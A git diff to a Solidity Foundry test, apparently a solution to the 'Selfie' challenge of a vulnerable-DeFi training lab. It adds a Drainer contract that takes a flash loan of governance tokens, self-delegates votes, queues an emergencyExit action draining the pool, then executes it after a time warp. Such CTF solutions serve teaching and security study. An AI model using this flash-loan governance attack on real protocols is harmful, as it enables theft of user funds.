@@ -5,6 +5,8 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
 contract SelfieChallenge is Test {
@@ -62,7 +64,10 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Drainer drainer = new Drainer(address(pool), address(governance), address(token), recovery);
+        drainer.startAttack();
+        vm.warp(block.timestamp + 2 days + 1);
+        drainer.executeProposal();
     }
 
     /**
@@ -74,3 +79,48 @@ contract SelfieChallenge is Test {
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
 }
+
+ contract Drainer is IERC3156FlashBorrower {
+        SelfiePool pool;
+        SimpleGovernance governance;
+        DamnValuableVotes token;
+        address recovery;
+        uint256 actionId;
+        bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+        constructor(address _pool, address _governance, address _token, address _recovery) {
+            pool = SelfiePool(_pool);
+            governance = SimpleGovernance(_governance);
+            token = DamnValuableVotes(_token);
+            recovery = _recovery;
+        }
+
+        function startAttack() external {
+            uint256 amount = SelfiePool(pool).maxFlashLoan(address(token));
+            SelfiePool(pool).flashLoan(this, address(token), amount, "");
+        }
+
+        function onFlashLoan(
+            address sender,
+            address _token,
+            uint256 amount,
+            uint256 fee,
+            bytes calldata data
+        ) external returns (bytes32) {
+
+            require(msg.sender == address(pool), "Pool is not sender");
+            require(sender == address(this), "Sender is not the owner");
+
+            token.delegate(address(this));
+
+            bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", recovery);
+            actionId = governance.queueAction(address(pool), 0, payload);
+
+            token.approve(address(pool), amount);
+            return CALLBACK_SUCCESS;
+        }
+
+        function executeProposal() external {
+            governance.executeAction(actionId);
+        }
+    }
